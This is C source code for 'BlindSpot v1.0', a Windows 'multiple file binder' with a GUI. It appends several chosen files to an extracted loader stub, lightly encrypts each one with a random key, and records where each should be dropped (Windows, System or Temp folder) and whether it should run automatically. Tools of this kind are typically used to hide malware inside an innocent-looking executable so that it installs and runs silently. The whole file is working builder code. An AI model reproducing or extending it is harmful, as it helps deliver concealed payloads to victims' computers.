/*
			BlindSpot v1.0
			- Multiple file binder with a small stub.

			Coded by: s134k
*/

#pragma comment(lib, "COMCTL32")
#pragma comment(lib, "SHLWAPI")

#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <commctrl.h>
#include <shlwapi.h>
#include "resource.h"

#define WIN32_LEAN_AND_MEAN
#define BUF_SIZE 256

HWND hwndList;
HINSTANCE hInst;
HANDLE hLoader;
LONG run, windir, sysdir, tmpdir;
BOOL cancel;
int iIndex, iSelect;

struct file_data {
	char name[40];
	unsigned long size;
	int key;
	short path;
	short run;
} *pfile_data;

BOOL CALLBACK DialogProc(HWND, UINT, WPARAM, LPARAM);
void InitList(void);
BOOL CALLBACK AddDialogProc(HWND, UINT, WPARAM, LPARAM);
BOOL ExtractLoader(char *);
int WriteFiles(int);
void RandCryptKey(char *);
void EncryptRecord(char *, unsigned long, char *);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	INITCOMMONCONTROLSEX icc;

	icc.dwICC = ICC_LISTVIEW_CLASSES;
	icc.dwSize = sizeof(INITCOMMONCONTROLSEX);

	InitCommonControlsEx(&icc);

	hInst = hInstance;

	return DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG), NULL, DialogProc);
}

BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	LPNMHDR lpnmhdr;
	LPNMITEMACTIVATE lpnmitem;
	LVITEM lvItem;
	LVHITTESTINFO lvHti;
	HMENU hMenu;
	POINT pt;
	OPENFILENAME ofn;
	char szFile[MAX_PATH], szSize[15], *szDir = "", szBound[_MAX_FNAME] = "bound";
	HANDLE hFile;
	DWORD dwSize;

	switch(uMsg) {
	case WM_INITDIALOG:
		SendMessage(hwndDlg, WM_SETICON, (WPARAM)1, (LPARAM)LoadIcon(hInst, MAKEINTRESOURCE(IDI_ICON)));

		hwndList = GetDlgItem(hwndDlg, IDC_LIST);

		ListView_SetExtendedListViewStyle(hwndList, LVS_EX_FULLROWSELECT | LVS_EX_HEADERDRAGDROP | LVS_EX_GRIDLINES);
		InitList();

		return TRUE;
	case WM_NOTIFY:
		lpnmhdr = (LPNMHDR)lParam;
		if(lpnmhdr->hwndFrom == hwndList) {
			if(lpnmhdr->code == NM_RCLICK) {
				lpnmitem = (LPNMITEMACTIVATE)lParam;
				hMenu = CreatePopupMenu();

				ZeroMemory(&lvHti, sizeof(LVHITTESTINFO));

				lvHti.pt = lpnmitem->ptAction;
				iSelect = ListView_HitTest(hwndList, &lvHti);

				if(lvHti.flags & LVHT_ONITEM) {
					AppendMenu(hMenu, MF_GRAYED | MF_STRING, IDM_ADD, "Add");
					AppendMenu(hMenu, MF_STRING, IDM_REMOVE, "Remove");
				}
				else {
					AppendMenu(hMenu, MF_STRING, IDM_ADD, "Add");
					AppendMenu(hMenu, MF_GRAYED | MF_STRING, IDM_REMOVE, "Remove");
				}

				AppendMenu(hMenu, MF_SEPARATOR, 0, NULL);

				if(iIndex < 2)
					AppendMenu(hMenu, MF_GRAYED | MF_STRING, IDM_BIND, "Bind");
				else
					AppendMenu(hMenu, MF_STRING, IDM_BIND, "Bind");

				GetCursorPos(&pt);
				TrackPopupMenu(hMenu, TPM_LEFTALIGN, pt.x, pt.y, 0, hwndDlg, 0);
			}
		}
		DestroyMenu(hMenu);

		return TRUE;
	case WM_COMMAND:
		switch(LOWORD(wParam)) {
		case IDM_ADD:
			ZeroMemory(&ofn, sizeof(OPENFILENAME));
			ZeroMemory(szFile, sizeof szFile);
			ZeroMemory(szDir, sizeof szDir);

			ofn.lStructSize = sizeof(OPENFILENAME);
			ofn.hwndOwner = hwndDlg;
			ofn.lpstrFilter = "All Files (*.*)\0*.*\0";
			ofn.lpstrFile = szFile;
			ofn.nMaxFile = MAX_PATH;
			ofn.Flags = OFN_EXPLORER | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;

			if(GetOpenFileName(&ofn)) {
				cancel = FALSE;

				DialogBox(hInst, MAKEINTRESOURCE(IDD_DIALOG_ADD), hwndDlg, AddDialogProc);

				if(!cancel) {
					lvItem.mask = LVIF_TEXT;
					lvItem.cchTextMax = MAX_PATH;

					lvItem.iItem = iIndex;
					lvItem.iSubItem = 0;
					lvItem.pszText = szFile;

					ListView_InsertItem(hwndList, &lvItem);

					hFile = CreateFile(szFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

					if(hFile == INVALID_HANDLE_VALUE)
						return FALSE;
					
					dwSize = GetFileSize(hFile, NULL);

					CloseHandle(hFile);
					wsprintf(szSize, "%d KB", dwSize / 1024);

					lvItem.iItem = iIndex;
					lvItem.iSubItem = 1;
					lvItem.pszText = szSize;

					ListView_SetItem(hwndList, &lvItem);

					lvItem.iItem = iIndex;
					lvItem.iSubItem = 2;

					if(windir == BST_CHECKED)
						szDir = "Windows";
					else if(sysdir == BST_CHECKED)
						szDir = "System";
					else
						szDir = "Temporary";

					lvItem.pszText = szDir;

					ListView_SetItem(hwndList, &lvItem);

					lvItem.iItem = iIndex;
					lvItem.iSubItem = 3;
				
					if(run == BST_CHECKED)
						lvItem.pszText = "Yes";
					else
						lvItem.pszText = "No";

					ListView_SetItem(hwndList, &lvItem);

					iIndex++;
				}
			}

			return TRUE;
		case IDM_REMOVE:
			ListView_DeleteItem(hwndList, iSelect);

			iIndex--;

			return TRUE;
		case IDM_BIND:
			ZeroMemory(&ofn, sizeof(OPENFILENAME));

			ofn.lStructSize = sizeof(OPENFILENAME);
			ofn.hwndOwner = hwndDlg;
			ofn.lpstrFilter = "Application (*.exe)\0*.exe\0";
			ofn.lpstrFile = szBound;
			ofn.lpstrDefExt = "exe";
			ofn.nMaxFile = MAX_PATH;
			ofn.Flags = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;

			if(GetSaveFileName(&ofn)) {
				if(!ExtractLoader(szBound))
					return FALSE;

				if(!WriteFiles(iIndex)) {
					MessageBox(hwndDlg, "Error writing files.", NULL, MB_OK);

					CloseHandle(hLoader);

					return FALSE;
				}
			}

			return TRUE;
		}
	case WM_CLOSE:
		EndDialog(hwndDlg, 0);

		return TRUE;
	}

	return FALSE;
}

void InitList(void)
{
	LVCOLUMN lvCol;
	char *szColumn[] = {"File", "Size", "Installation Directory", "Run"};
	int i, width[] = {220, 55, 160, 35};

	ZeroMemory(&lvCol, sizeof(LVCOLUMN));

	lvCol.mask = LVCF_TEXT | LVCF_SUBITEM | LVCF_WIDTH | LVCF_FMT;
	lvCol.fmt = LVCFMT_LEFT;

	for(i = 0; i < 4; i++) {
		lvCol.iSubItem = i;
		lvCol.cx = width[i];
		lvCol.pszText = szColumn[i];

		ListView_InsertColumn(hwndList, i, &lvCol);
	}
}

BOOL CALLBACK AddDialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch(uMsg) {
	case WM_COMMAND:
		switch(LOWORD(wParam)) {
		case IDOK:
			run = SendDlgItemMessage(hwndDlg, IDC_CHECK_RUN, BM_GETCHECK, wParam, lParam);

			windir = SendDlgItemMessage(hwndDlg, IDC_RADIO_WINDIR, BM_GETCHECK, wParam, lParam);
			sysdir = SendDlgItemMessage(hwndDlg, IDC_RADIO_SYSDIR, BM_GETCHECK, wParam, lParam);
			tmpdir = SendDlgItemMessage(hwndDlg, IDC_RADIO_TMPDIR, BM_GETCHECK, wParam, lParam);

			if(windir != BST_CHECKED && sysdir != BST_CHECKED && tmpdir != BST_CHECKED)
				MessageBox(hwndDlg, "You have not selected an installation directory.", NULL, MB_ICONERROR | MB_OK);
			else
				EndDialog(hwndDlg, 0);

			return TRUE;
		case IDCANCEL:
			cancel = TRUE;

			EndDialog(hwndDlg, 0);

			return TRUE;
		}
		break;
		case WM_CLOSE:
			cancel = TRUE;

			EndDialog(hwndDlg, 0);

			return TRUE;
	}

	return FALSE;
}

BOOL ExtractLoader(char *szLoc)
{
	HRSRC rc;
	HGLOBAL hGlobal;
	HMODULE hThisProc;
	DWORD dwSize, dwBytesWritten;
	unsigned char *lpszData;

	hThisProc = GetModuleHandle(NULL);
	rc = FindResource(hThisProc, MAKEINTRESOURCE(IDR_RT_EXE), "RT_EXE");

	if(hGlobal = LoadResource(hThisProc, rc)) {
		lpszData = (unsigned char *)LockResource(hGlobal);
		dwSize = SizeofResource(hThisProc, rc);
		hLoader = CreateFile(szLoc, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if(hLoader == INVALID_HANDLE_VALUE)
			return FALSE;
		else
			WriteFile(hLoader, lpszData, dwSize, &dwBytesWritten, NULL);
	}

	if(dwBytesWritten != dwSize) {
		MessageBox(NULL, "Error writing stub file.", NULL, MB_ICONERROR | MB_OK);

		return FALSE;
	}
	else
		return TRUE;
}

int WriteFiles(int nFileNum)
{
	int i;
	HANDLE hFile;
	DWORD dwStart, dwBytesWritten, dwBytesRead, dwSize;
	char szPath[MAX_PATH], szDir[10], szExec[4], szKey[5], buf[BUF_SIZE], done[40];
	struct file_data fd;

	pfile_data = &fd;
	dwStart = GetTickCount();

	srand(dwStart);

	for(i = 0; i < nFileNum; i++) {
		ZeroMemory(&fd, sizeof fd);

		ListView_GetItemText(hwndList, i, 0, szPath, MAX_PATH);

		hFile = CreateFile(szPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hFile == INVALID_HANDLE_VALUE)
			return 0;

		dwSize = GetFileSize(hFile, NULL);
		pfile_data->size = dwSize;

		strcpy(pfile_data->name, PathFindFileName(szPath));

		ListView_GetItemText(hwndList, i, 2, szDir, sizeof szDir);

		if(!strcmp(szDir, "System"))
			pfile_data->path = 1;
		else if(!strcmp(szDir, "Temporary"))
			pfile_data->path = 2;
		else
			pfile_data->path = 3;

		ListView_GetItemText(hwndList, i, 3, szExec, sizeof szExec);

		pfile_data->run = strcmp(szExec, "Yes") == 0 ? 1 : 0;

		RandCryptKey(szKey);
		pfile_data->key = atoi(szKey);

		SetFilePointer(hLoader, 0, NULL, FILE_END);
		WriteFile(hLoader, pfile_data, sizeof fd, &dwBytesWritten, NULL);

		while(ReadFile(hFile, buf, BUF_SIZE, &dwBytesRead, NULL) && dwBytesRead) {
			EncryptRecord(buf, dwBytesRead, szKey);
			WriteFile(hLoader, buf, dwBytesRead, &dwBytesWritten, NULL);
			if(dwBytesWritten != dwBytesRead)
				return 0;
		}

		CloseHandle(hFile);
	}

	if(i == nFileNum) {
		wsprintf(done, "%d Files bound in %d second(s).", nFileNum, (GetTickCount() - dwStart) / 1000);

		MessageBox(NULL, done, "Finished.", MB_OK);
	}
	else
		return 0;

	CloseHandle(hLoader);
	
	return i;
}

void RandCryptKey(char *szIn)
{
	int i;

	do i = rand();
	while(i < 1000 || i > 10000);

	wsprintf(szIn, "%d", i);
}

void EncryptRecord(char *szRec, unsigned long nLen, char *szKey)
{
	unsigned long i;
	char *p;

	p = szKey;

	for(i = 0; i < nLen; i++) {
		if(!(*p))
			p = szKey;

		*szRec ^= *p;
		*szRec += *p;

		szRec++;
		p++;
	}
}    
	   